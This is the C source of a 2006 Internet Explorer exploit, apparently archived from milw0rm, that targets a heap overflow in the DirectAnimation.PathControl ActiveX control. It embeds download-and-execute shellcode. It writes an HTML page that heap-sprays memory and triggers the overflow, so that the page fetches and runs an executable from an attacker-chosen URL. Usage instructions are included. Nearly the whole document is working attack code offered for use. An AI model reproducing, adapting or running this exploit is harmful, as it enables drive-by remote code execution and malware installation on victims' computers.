<html><head><title>MS Internet Explorer COM Object Remote Heap Overflow Exploit</title></head><pre>/*
*-----------------------------------------------------------------------
*
* daxctle2.c - Internet Explorer COM Object Heap Overflow Download Exec Exploit
* !!! 0day !!!  Public Version !!!
*
* Copyright (C) 2006 XSec All Rights Reserved.
*
* Author   : nop
*          : nop#xsec.org
*          : http://www.xsec.org
*          :
* Tested   : Windows 2000 Server SP4 CN
*          :     + Internet Explorer 6.0 SP1
*          : Windows XP SP2 CN
*          :     + Internet Explorer 6.0 SP1 (You need some goodluck! :-)
*          :
* Complie  : cl daxctle2.c
*          :
* Usage       :d:\&gt;daxctle2
*          :
*          :Usage: daxctle &lt;URL&gt; [htmlfile]
*          :
*          :d:\&gt;daxctle2 http://xsec.org/xxx.exe xxx.htm
*          :
*          
*------------------------------------------------------------------------
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

FILE *fp = NULL;
char *file = &quot;xsec.htm&quot;;
char *url = NULL;

// Download Exec Shellcode by nop
unsigned char sc[] =     
&quot;\xe9\xa3\x00\x00\x00\x5f\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b&quot;
&quot;\x70\x1c\xad\x8b\x68\x08\x8b\xf7\x6a\x04\x59\xe8\x43\x00\x00\x00&quot;
&quot;\xe2\xf9\x68\x6f\x6e\x00\x00\x68\x75\x72\x6c\x6d\x54\xff\x16\x95&quot;
&quot;\xe8\x2e\x00\x00\x00\x83\xec\x20\x8b\xdc\x6a\x20\x53\xff\x56\x04&quot;
&quot;\xc7\x04\x03\x5c\x61\x2e\x65\xc7\x44\x03\x04\x78\x65\x00\x00\x33&quot;
&quot;\xc0\x50\x50\x53\x57\x50\xff\x56\x10\x8b\xdc\x50\x53\xff\x56\x08&quot;
&quot;\xff\x56\x0c\x51\x56\x8b\x75\x3c\x8b\x74\x2e\x78\x03\xf5\x56\x8b&quot;
&quot;\x76\x20\x03\xf5\x33\xc9\x49\x41\xad\x03\xc5\x33\xdb\x0f\xbe\x10&quot;
&quot;\x3a\xd6\x74\x08\xc1\xcb\x0d\x03\xda\x40\xeb\xf1\x3b\x1f\x75\xe7&quot;
&quot;\x5e\x8b\x5e\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5e\x1c\x03\xdd\x8b&quot;
&quot;\x04\x8b\x03\xc5\xab\x5e\x59\xc3\xe8\x58\xff\xff\xff\x8e\x4e\x0e&quot;
&quot;\xec\xc1\x79\xe5\xb8\x98\xfe\x8a\x0e\xef\xce\xe0\x60\x36\x1a\x2f&quot;
&quot;\x70&quot;;    

char * header =
&quot;&lt;html&gt;\n&quot;
&quot;&lt;head&gt;\n&quot;
&quot;&lt;title&gt;XSec.org&lt;/title&gt;\n&quot;
&quot;&lt;/head&gt;\n&quot;
&quot;&lt;body&gt;\n&quot;
&quot;&lt;script&gt;\n&quot;
&quot;shellcode = unescape(\&quot;%u4343\&quot;+\&quot;%u4343\&quot;+\&quot;%u4343\&quot; + \n&quot;;

// Change this script by yourself.
char * footer =
&quot;bigbk = unescape(\&quot;%u0D0D%u0D0D\&quot;);\n&quot;
&quot;headersize = 20;\n&quot;
&quot;slackspace = headersize + shellcode.length\n&quot;
&quot;while (bigbk.length &lt; slackspace) bigbk += bigbk;\n&quot;
&quot;fillbk = bigbk.substring(0, slackspace);\n&quot;
&quot;bk = bigbk.substring(0, bigbk.length-slackspace);\n&quot;
// bk = nop+nop;-)
&quot;while(bk.length+slackspace &lt; 0x40000) bk = bk + bk + fillbk;\n&quot;  
&quot;memory = new Array();\n&quot;
&quot;for (i=0;i&lt;800;i++) memory[i] = bk + shellcode;\n&quot;
&quot;var target = new ActiveXObject(\&quot;DirectAnimation.PathControl\&quot;);\n&quot;
&quot;target.KeyFrame(0x7fffffff, new Array(1), new Array(65535));\n&quot;
&quot;&lt;/script&gt;\n&quot;
&quot;&lt;/body&gt;\n&quot;
&quot;&lt;/html&gt;\n&quot;;

// print unicode shellcode
void PrintUc(char *lpBuff, int buffsize)
{
   int i,j;
   char *p;
   char msg[4];

   for(i=0;i&lt;buffsize;i+=2)
       {
       if((i%16)==0)
       {
           if(i!=0)
           {
               printf(&quot;\&quot;\n\&quot;&quot;);
               fprintf(fp, &quot;%s&quot;, &quot;\&quot; +\n\&quot;&quot;);
           }
           else
           {
               printf(&quot;\&quot;&quot;);
               fprintf(fp, &quot;%s&quot;, &quot;\&quot;&quot;);
           }
       }
           
       printf(&quot;%%u%0.4x&quot;,((unsigned short*)lpBuff)[i/2]);
       
       fprintf(fp, &quot;%%u%0.4x&quot;,((unsigned short*)lpBuff)[i/2]);
     }
     

       printf(&quot;\&quot;;\n&quot;);
       fprintf(fp, &quot;%s&quot;, &quot;\&quot;);\n&quot;);          
   
   
   fflush(fp);
}

void main(int argc, char **argv)
{
   unsigned char buf[1024] = {0};

   int sc_len = 0;


        if (argc &lt; 2)
   {
         printf(&quot;Internet Explorer COM Object Remote Heap Overflow Download Exec Exploit\n&quot;);
         printf(&quot;Code by nop nop#xsec.org, Welcome to http://www.xsec.org\n&quot;);
         //printf(&quot;!!! 0Day !!! Please Keep Private!!!\n&quot;);
       printf(&quot;\r\nUsage: %s &lt;URL&gt; [htmlfile]\r\n\n&quot;, argv[0]);
       exit(1);
   }
   
   url = argv[1];
   
   //if( (!strstr(url, &quot;http://&quot;) &amp;&amp;  !strstr(url, &quot;ftp://&quot;)) || strlen(url) &lt; 10 || strlen(url) &gt; 60)
        if( (!strstr(url, &quot;http://&quot;) &amp;&amp;  !strstr(url, &quot;ftp://&quot;)) || strlen(url) &lt; 10)
        {
            //printf(&quot;[-] Invalid url. Must start with 'http://','ftp://' and &lt; 60 bytes.\n&quot;);
            printf(&quot;[-] Invalid url. Must start with 'http://','ftp://'\n&quot;);
            return;                
        }

      printf(&quot;[+] download url:%s\n&quot;, url);
      
      if(argc &gt;=3) file = argv[2];
      printf(&quot;[+] exploit file:%s\n&quot;, file);
       
   fp = fopen(file, &quot;w&quot;);
   if(!fp)
   {
       printf(&quot;[-] Open file error!\n&quot;);
          return;
   }    
   
   // print html header
   fprintf(fp, &quot;%s&quot;, header);
   fflush(fp);
   
   // print shellcode
   memset(buf, 0, sizeof(buf));
   sc_len = sizeof(sc)-1;
   memcpy(buf, sc, sc_len);
   memcpy(buf+sc_len, url, strlen(url));
   
   sc_len += strlen(url)+1;
   PrintUc(buf, sc_len);
 
   // print html footer
   fprintf(fp, &quot;%s&quot;, footer);
   fflush(fp);  
   
   printf(&quot;[+] exploit write to %s success!\n&quot;, file);
}

// milw0rm.com [2006-09-13]</pre></html>